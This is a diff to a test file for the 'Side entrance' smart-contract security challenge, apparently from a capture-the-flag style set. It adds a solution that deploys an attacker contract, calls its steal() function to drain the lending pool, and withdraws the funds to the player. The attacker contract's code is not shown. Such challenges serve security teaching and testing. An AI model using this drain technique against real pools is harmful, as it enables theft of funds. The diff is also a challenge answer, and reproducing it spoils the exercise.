@@ -26,6 +26,10 @@ describe('[Challenge] Side entrance', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const borrower = await (await ethers.getContractFactory('SideEntranceBorrower', deployer))
+          .deploy(player.address, pool.address);
+        await borrower.steal();
+        await borrower.connect(player).withdraw();
     });
 
     after(async function () {
